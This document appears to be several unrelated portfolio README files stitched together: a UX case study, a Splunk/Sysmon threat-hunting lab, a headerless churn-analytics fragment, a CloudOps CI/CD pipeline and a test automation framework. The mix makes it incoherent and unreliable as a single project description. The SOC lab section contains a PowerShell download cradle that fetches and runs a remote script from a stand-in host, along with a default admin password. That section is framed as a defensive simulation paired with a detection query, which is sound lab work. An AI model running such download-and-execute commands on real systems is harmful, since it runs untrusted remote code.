# PulseSaaS - B2B Workflow & Analytics UX/UI Case Study

[![Figma](https://img.shields.io/badge/Figma-Design_System-F24E1E.svg)](https://www.figma.com)
[![WCAG](https://img.shields.io/badge/WCAG-2.1_AA-green.svg)](https://www.w3.org/WAI/WCAG21/quickref/)
[![Status](https://img.shields.io/badge/Portfolio-Case_Study_Ready-blue.svg)](#)

## 📌 Executive Summary
An end-to-end UX/UI Product Case Study tackling complex data fragmentation in enterprise B2B SaaS workflows. Demonstrates a full Double Diamond design process from generative research to developer-ready Figma tokens.

---

## 🎨 Interactive Figma Prototype & Specs
- **Live Interactive Prototype:** [Open in Figma Prototype Viewer](#)
- **Component Design System:** 48 Accessible Components, Auto-layout 5.0, Typography & Spacing Tokens.

---

## 🔍 The Research Process
1. **Discovery & Problem Framing:** 5 semi-structured stakeholder interviews identifying 3 major cognitive bottlenecks.
2. **Information Architecture (IA):** Simplified hierarchical tree reducing menu depth from 4 levels to 2.
3. **Usability Testing:** Evaluated task success rate across 12 participants in Maze (task completion improved by 34%).
4. **Dev Hand-off:** Redline annotations, responsive breakpoint specs (Mobile 390px, Tablet 834px, Desktop 1440px), and token names aligned with Tailwind CSS.

# Mini-SOC Threat Hunting & Detection Lab (Splunk + Sysmon)

[![Splunk](https://img.shields.io/badge/Splunk-SIEM-black.svg)](https://www.splunk.com/)
[![Sysmon](https://img.shields.io/badge/Sysmon-Telemetry-blue.svg)](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
[![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-red.svg)](https://attack.mitre.org/)

## 📌 Project Overview
A practical, hands-on defensive security lab designed to simulate enterprise SOC workflows. It ingests Sysmon endpoint telemetry into a containerized Splunk instance, executes controlled adversary techniques, and validates detection rules mapped to the MITRE ATT&CK matrix.

---

## 🏗️ Architecture
```
+-----------------------+       +------------------------+       +----------------------+
| Endpoint / VM         | ----> | Splunk Universal       | ----> | Splunk Indexer &     |
| (Sysmon + Event Logs) |       | Forwarder              |       | Alerting Dashboard   |
+-----------------------+       +------------------------+       +----------------------+
```

---

## 📁 Lab Structure
```bash
├── docker-compose.yml       # Spin up Splunk Core container
├── configs/
│   └── sysmon-config.xml    # SwiftOnSecurity optimized telemetry
├── queries/
│   ├── brute_force.spl      # SPL query for Event ID 4625 spikes
│   └── powershell_exec.spl  # Encoded PowerShell execution hunt
└── README.md
```

---

## 🚀 Quickstart Guide

### 1. Launch Splunk Container
```bash
docker-compose up -d
```
Navigate to `http://localhost:8000` (Default: `admin` / `Changeme123!`)

### 2. Run Adversary Simulation (MITRE T1059.001)
```powershell
# Execute obfuscated download cradle simulation
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://mock-payload.local/test.ps1')
```

### 3. Detection Validation in Splunk
```spl
index=sysmon EventCode=1 Image="*\\powershell.exe" CommandLine="*DownloadString*"
| table _time, host, User, CommandLine, ParentImage
```

End-to-end data analytics workflow uncovering churn velocity and customer lifetime value (LTV) for a recurring subscription model. Combines relational SQL modeling with advanced cohort analytics.

---

1. Ingestion: Raw transactional dataset (50,000+ subscription rows)
2. SQL Modeling: Cohort groupings and Windowed retention calculations
3. Exploratory Data Analysis: Python/Pandas feature correlation
4. Executive Dashboard: Interactive executive KPI summary

portfolio_project.readme_content:
# CloudOps Pipeline – Production-Grade CI/CD & IaC Infrastructure

Automated GitOps pipeline provisioning AWS infrastructure via Terraform, packaging microservices with Docker, and orchestrating deployments on Kubernetes with Prometheus/Grafana observability.

## Architecture
- **IaC**: Terraform 1.6+ (AWS VPC, Security Groups, ECR)
- **Container**: Docker Multi-stage builds (<50MB)
- **CI/CD**: GitHub Actions (Lint, Security Scan, Build, Push)
- **Orchestration**: Kubernetes manifests (Deployment, HPA, Ingress)
- **Monitoring**: Prometheus scraper & Grafana dashboard

## Quick Start
```bash
# 1. Initialize & plan cloud infrastructure
cd terraform && terraform init && terraform plan

# 2. Deploy local orchestration
kubectl apply -f k8s/

# 3. View live monitoring
kubectl port-forward svc/grafana 3000:3000
```

portfolio_project.readme_content:
# QualityGuard – Modular E2E & API Automation Framework

Production-ready test automation framework engineered in Python utilizing PyTest, Selenium, and Requests, implementing Page Object Model (POM) and GitHub Actions CI execution.

## Key Highlights
- **Pattern**: Strict Page Object Model (POM) architecture
- **Coverage**: Full E2E flows + REST API endpoint assertions
- **Reporting**: Detailed PyTest-HTML reports with auto-captured failure screenshots
- **CI/CD**: Headless multi-browser test runner in GitHub Actions

## Quick Start
```bash
# 1. Install dependencies
pip install -r requirements.txt

# 2. Execute E2E & API test suites with HTML report
pytest --html=reports/test_report.html --self-contained-html
```
